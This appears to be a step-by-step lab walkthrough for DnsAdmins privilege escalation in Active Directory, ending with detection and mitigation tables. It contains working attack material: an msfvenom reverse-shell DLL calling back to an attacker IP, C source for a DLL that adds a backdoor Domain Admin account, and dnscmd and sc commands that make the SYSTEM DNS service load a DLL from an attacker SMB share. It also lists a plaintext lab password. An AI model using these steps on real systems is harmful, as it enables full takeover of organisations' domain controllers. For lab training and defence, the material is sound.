# DnsAdmins Abuse

## Overview

Members of the **DnsAdmins** group can configure the DNS server to load a custom **DLL plugin**. The DNS service runs as `SYSTEM`, so the DLL executes with full system privileges on the DC.

## Lab Account

| Account | Group | Password |
|---------|-------|----------|
| `khalid.nasser` | DnsAdmins | `p@ssw0rd` |

Set by `Setup-ExtraAttacks.ps1`:
```powershell
Add-ADGroupMember -Identity "DnsAdmins" -Members "khalid.nasser"
```

## Step 1 — Verify Membership

```powershell
# From WS-01 or any domain machine
Get-ADGroupMember "DnsAdmins" | Select SamAccountName
```

## Step 2 — Create Malicious DLL

### Option A: msfvenom reverse shell

```bash
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=192.168.56.30 LPORT=4444 \
  -f dll -o evil.dll
```

### Option B: Add a backdoor domain admin

```c
// evil.c — adds attacker.01 to Domain Admins
#include <windows.h>
#include <stdlib.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r) {
    if (reason == DLL_PROCESS_ATTACH)
        system("net group \"Domain Admins\" attacker.01 /add /domain");
    return TRUE;
}
// Compile: x86_64-w64-mingw32-gcc -shared -o evil.dll evil.c
```

### Option C: DNSAdmin-DLL helper

```bash
git clone https://github.com/kazkansouh/DNSAdmin-DLL
cd DNSAdmin-DLL && make
```

## Step 3 — Host DLL on SMB Share

```bash
# On attacker machine (192.168.56.30)
# Start an SMB share with Impacket
smbserver.py share . -smb2support

# Share path: \\192.168.56.30\share\evil.dll
```

## Step 4 — Configure DNS Plugin (as khalid.nasser)

```powershell
# Authenticate as khalid.nasser from WS-01
$cred = Get-Credential  # corp\khalid.nasser / p@ssw0rd

# Set the plugin DLL path
dnscmd DC-01.corp.local /config /serverlevelplugindll \\192.168.56.30\share\evil.dll

# Verify it was set
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters" -Name ServerLevelPluginDll
```

> **Note:** You must run `dnscmd` in a session authenticated as `khalid.nasser`, or specify `/u corp\khalid.nasser` flag.

## Step 5 — Trigger DLL Load

The DLL loads when the DNS service (re)starts. Members of DnsAdmins **cannot** restart DNS, but you can abuse `sc`:

```powershell
# Restart DNS service (requires SC_MANAGER_CONNECT on DNS — DnsAdmins have this)
sc.exe \\DC-01.corp.local stop dns
sc.exe \\DC-01.corp.local start dns
```

Or wait for the next DC reboot.

## Step 6 — Catch Shell / Verify

```bash
# Option A: Catch reverse shell
nc -lvnp 4444

# Option B: Verify backdoor account added
Get-ADGroupMember "Domain Admins" | Select SamAccountName
```

## Full Attack Chain

```
khalid.nasser (DnsAdmins)
  └─ dnscmd /config /serverlevelplugindll \\attacker\evil.dll
      └─ Restart DNS service on DC-01
          └─ DNS.exe (SYSTEM) loads evil.dll
              └─ Reverse shell as SYSTEM on DC-01
                  └─ Full Domain Compromise
```

## Cleanup

```powershell
# Remove the plugin (run as DA or on DC-01)
dnscmd DC-01.corp.local /config /serverlevelplugindll ""
# Restart DNS again
sc.exe \\DC-01.corp.local stop dns
sc.exe \\DC-01.corp.local start dns
```

## Detection

| Indicator | Source |
|-----------|--------|
| Registry modification: `ServerLevelPluginDll` | Event 4657 on DC-01 |
| DNS service restart | System Event 7036 |
| Outbound SMB from DC-01 to attacker | Network logs |
| DLL loaded by DNS.exe | Sysmon Event 7 (ImageLoad) |

## Mitigations

- Remove non-essential users from DnsAdmins
- Audit DnsAdmins membership regularly
- Block outbound SMB from DCs (port 445)
- Enable Sysmon ImageLoad events for DNS.exe
